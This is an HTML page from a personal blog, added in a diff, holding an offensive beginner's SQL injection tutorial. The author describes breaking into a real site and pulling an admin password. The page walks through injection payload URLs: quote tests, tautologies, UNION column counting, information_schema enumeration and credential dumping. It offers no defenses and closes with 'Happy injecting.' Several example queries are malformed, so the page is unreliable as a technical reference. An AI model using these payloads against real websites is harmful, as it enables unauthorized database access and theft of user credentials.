@@ -1,0 +1,304 @@
+<!doctype html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en"> <![endif]-->
+<!--[if IE 7]> <html class="no-js ie7 oldie" lang="en"> <![endif]-->
+<!--[if IE 8]> <html class="no-js ie8 oldie" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+<head>
+
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width" />
+
+	
+	<title>sql injection tutorial for beginners | Mohammed Habib - in.sane</title>
+	
+	<meta name="author" content="Ryan Tell">
+	<meta name="description" content="Ryan Tell is an experimental electronic musician from Milwaukee, Wisconsin.">
+
+	<link href="/public/css/style.css" media="screen, projection" rel="stylesheet" type="text/css" />
+	<link href="/public/css/normalize.min.css" media="screen, projection" rel="stylesheet" type="text/css" />
+	<!--[if lt IE 9]>
+	<script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+	<link rel="stylesheet" href="/public/css/ie.css" type="text/css" media="screen">
+	<![endif]-->
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+	<script src="/public/js/vendor/modernizr-2.6.1.min.js"></script>
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-28591116-2']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+</head>
+
+<html>
+
+	<body>
+
+		<div class="container">
+			<div id="header-container">
+	<header class="wrapper clearfix">
+		<div class="left">
+			<img src="/public/img/me.jpg" class="me">
+			<h1 id="title">Mohammed Habib</h1>
+			<p class="caption">Beyond the borders of sanity</p>
+		</div>
+		<nav>
+		<ul>
+		<li><a href="/index.html">Home</a></li>
+		<li><a href="/about.html">About</a></li>
+		<li><a href="/projects.html">Projects</a></li>
+		</ul>
+		</nav>
+	</header>
+</div>
+
+			<div id="main-container">
+				<div id="main" class="wrapper clearfix">
+				<div class="column-12 post">
+	<h1><a href="/blog/2012/04/27/sql-injection-php-mysql-tutorial" title="sql injection tutorial for beginners">sql injection tutorial for beginners</a></h1>
+	<p>
+<span style="text-decoration: underline;"><em><strong>DISCLAIMER : </strong></em></span>Breaking into websites and doing damage is a bad thing, do not use the information in this article for destructive purposes. I am not accountable for any damage that may occur due to the information supplied in this article. You can do SQL injection for fun :)
+</p>
+
+<p>
+Okay so the other day I was just derping on this website, when suddenly, I noticed the Url was something like:
+</p>
+
+<p>
+<a href="http://www.vulnerablesite.com/promotion.php?id=1">http://www.vulnerablesite.com/promotion.php?id=1</a>
+</p>
+
+<p>
+And so I'm like, let me check and see if it's vulnerable to SQL injection. So I modified the URL to something like:
+</p>
+
+<p>
+<a href="http://www.vulnerablesite.com/promotion.php?id=1">http://www.vulnerablesite.com/promotion.php?id=1'</a><span style="text-decoration: underline;"><strong> or '1'='0</strong></span>
+</p>
+
+<p>
+And what do you know, it was! After hours of playing around with it, I managed to pull out an admin username and password (That wasn't hashed -_-) .
+</p>
+
+<p>
+For obvious reasons, I will not mention the vulnerable websites, but I will take you through a tour on my discoveries that may prove useful as a tutorial. While writing this tutorial, I took into account a PHP website, but it's applicable elsewhere. This tutorial assumes that you have a basic understanding of mysql and php. So let's begin !
+</p>
+
+<h2>The concept</h2>
+<p>
+While coding<em> dynamic</em> websites, you usually pull out content from a database. A commonly used database is mysql. So you can imagine a php script like this:
+</p>
+
+<pre>
+//get the product id
+
+$id = $_GET['id'];
+
+//connect to DB server and select database
+
+$q = mysql_query(&quot;SELECT * FROM  products WHERE id='$id' &quot;);
+//pull out rows and spit them out
+while ($row = mysql_fetch_array($q))
+
+{
+
+echo &quot;Product name:&quot; . $row['name'];
+
+echo &quot;Product description: &quot;. $row['desc'] ;
+
+}
+</pre>
+
+<p>
+okay so this query takes the <strong>id </strong>as an input from a user and uses it to validate user input. In this case, the web url will look something like this:
+</p>
+
+<p>
+<strong>http://www.vulnerablesite.com?<span style="text-decoration: underline;">id</span>=9</strong>
+</p>
+
+<p>
+<strong>Darth </strong>is an evil man. He decides to change the url to something like this (notice th trailing colon) :
+</p>
+
+<p>
+<strong>http://www.vulnerablesite.com?<span style="text-decoration: underline;">id</span>=9'</strong>
+</p>
+
+<p>
+Notice what he just did. Since that last colon is not being escaped, the new query will look something like this:
+</p>
+
+<p>
+<strong>SELECT * FROM  products WHERE id=' 9'' </strong>
+</p>
+
+<p>The query is wrong! This will issue an mysql error. and actually, this is a very good way to test for vulnerabilities. whenever in doubt, just add a colon!</p>
+
+<p>
+<blockquote><strong> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''9'' ORDER BY ISORT_ORDER ASC' at line 1</strong></blockquote>
+</p>
+<p>
+Okay now let's say we wanted to get rid of that error. Pretty easy, let's modify the url as follows (notice the missing last colon):
+</p>
+<p>
+<strong>http://www.vulnerablesite.com?<span style="text-decoration: underline;">id=9'</span> or '1'='1</strong>
+</p>
+<p>
+We didn't close the last colon because the php query will close it for us ;)
+</p>
+<p>
+<strong>SELECT * FROM  products WHERE id=' 9' or <span style="text-decoration: underline;">'1'='1'</span></strong>
+</p>
+<p>
+And now the query should work just fine. Here's another test that you can do to test for vulnerability:
+</p>
+<p>
+<strong>http://www.vulnerablesite.com?id=9' AND </strong>'0'='1
+</p>
+<p>
+Since <strong>zero</strong> is never equal to <strong>one</strong>, this will always return false, cause the page to NOT load correctly.
+</p>
+
+<h2>Exploring the possibilities</h2>
+<p>
+So you're wondering how this can be of any damage? Heh ... just wait and watch.
+</p>
+<p>
+let's modify the url to the following:
+</p>
+
+<p>
+<strong>http://www.vulnerablesite.com?id=9' UNION ALL SELECT  1 FROM users AND '1'='1</strong>
+</p>
+<p>
+Okay so before explaining, let's lay out the new query:
+</p>
+<p>
+<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1 FROM users AND '1'='1'</strong>
+</p>
+<p>
+Hmm, so what's this new query. What we did is we added another query to the existing one, and we did a UNION ALL to the results of both queries. a UNION ALL means BOTH queries will be processed, and both will be pulled out. You have access to his database now!!!! You can read more about unions <a href="http://dev.mysql.com/doc/refman/5.0/en/union.html">here</a> .
+</p>
+<p>
+Okay but does the DB has a table called USERS? We don't know. But we'll find out after trying the url above. Basically, we expect one of three results from the above query:
+</p>
+
+<blockquote>1) <strong>Table &lt;DB_NAME&gt;.USERS does not exist</strong></blockquote>
+<strong></strong>This means that the table does not exists (obviously).
+<blockquote>2) <strong>You'll see a "1" somewhere on the screen (or maybe in an IMG src of an HTML tag). Look good for it.</strong></blockquote>
+In this case, you got lucky, there actually is a table name USERS, all you have to do now is use a column name instead of "1" ;)
+<blockquote>3) <strong>The used SELECT statements have a different number of columns</strong></blockquote>
+
+<p>
+I forgot to mention that the UNION in SQL needs to have equal number of columns. If you see this, you need to keep increasing the number of columns by ONE a couple of times until the error disappears. For instance:
+</p>
+
+<p>
+<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1,2 FROM users AND '1'='1'</strong>
+</p>
+
+<p>
+And if that doesn't work ....
+</p>
+
+<p>
+<strong>SELECT * FROM  products WHERE id='UNION ALL SELECT  1,2,3 FROM users AND '1'='1'</strong>
+</p>
+
+<p>
+And so on .....
+</p>
+
+<p>
+Okay, now regardless of whether you ended up with ONE or TWO, if you're lucky and the version of mysql is &gt; 5, you can actually pull out the table names from the database. So you can try the following and if it's a version &gt;5, it should work.
+</p>
+
+<p>
+<strong>http://www.vulnerablesite.com/productdetails.php?id=-1'UNION ALL SELECT table_name,12,3,4,5,6,7 FROM information_schema.tables WHERE '1'='1</strong>
+</p>
+
+
+<blockquote>Note that in my case, ;i had to use 8 columns, it will probably differ for you.What i'm doing here is that i'm selecting a column called TABLE_NAME from the a table called TABLES. This table resides in the INFORMATION_SCHEMA database, and contains information from ALL tables in ALL DATABASES. You might want to limit that to only the target database schema. But do you know the name of the current schema? YES! if you write any union query with a wrong table name, you get an error:
+
+<p>
+<strong>Table &lt;DB_NAME&gt;.USERS does not exist</strong></blockquote>
+</p>
+<p>
+Which is your DB name. So now you can modify the query to the following to display data from only one DB schema:
+</p>
+
+<p>
+<strong>http://www.vulnerablesite.com/product.php?id=-1'UNION ALL SELECT table_name,12,3,4,5,6,7 FROM information_schema.tables<span style="text-decoration: underline;">  schema_name='&lt;DB_NAME&gt;</span> WHERE '1'='1</strong>
+</p>
+
+<p>
+from a column called schema_name, we can limit the schema.
+</p>
+
+<p>
+Okay so you found out about all the tables (dangerous) Now you need to find a table that has something to do with "users" or "admin", to pull credentials out. Once you found out that table name. You can also pull out the column names from the same INFORMATION_SCHEMA database.
+</p>
+
+<p>
+<strong>http://vulnerablesite.com/product.php?id=-9' union all select 1,2,column_name,4,5,6,7,8 from information_schema.columns where '1'='1'  AND table_name='tbl_admin</strong>
+</p>
+
+<p>
+<span style="text-decoration: underline;"><strong>NOTE:</strong></span> Notice that we changed the ID from +9 to -9. We do this for convinience, because we are sure that -9 will not return any results, so we know we're only viewing results from our query
+</p>
+
+<p>
+Pretty obvious really.Now that you pulled out the column names, you need to pull out a username and the password (that hopefully isn't hashed).
+</p>
+
+<p>
+<strong>http://vulnerablesite.com/product.php?id=-9' union all select 1,2,COLUMN_NAME,4,5,6,7,8 from &lt;TABLE_NAME&gt; where '1'='1</strong>
+</p>
+
+<p>
+so you should now see a list of usernames :D
+</p>
+
+<p>
+And you can now do the same for the passwords. You can wish that the passwords aren't hashed. if they are hashed tough luck :) .
+</p>
+
+<p>
+So This would probably show you how dangerous sql injection could be. Hopefully in a coming post, I shall enlist methods for protecting your website against sql injection.<strong> Until then. Happy injecting. </strong>
+</p>
+
+
+</strong>
+
+	<p class="back-arrow"><a href="/">&larr; Back</a></p>
+
+
+
+
+
+</div>
+				</div> <!-- #main -->
+			</div> <!-- #main-container -->
+
+
+			<footer class="row">
+	<div id="footer-container">
+		<footer class="wrapper">
+			<p>This site is hosted on <a href="https://github.com/moehabib/moehabib.github.com">github</a> and uses <a href="http://jekyllrb.com/">Jekyll</a>. Template is based on <a href="http://initializr.com/">initializr</a></p>
+		</footer>
+	</div>
+</footer>
+		</div>
+
+	</body>
+
+</html>
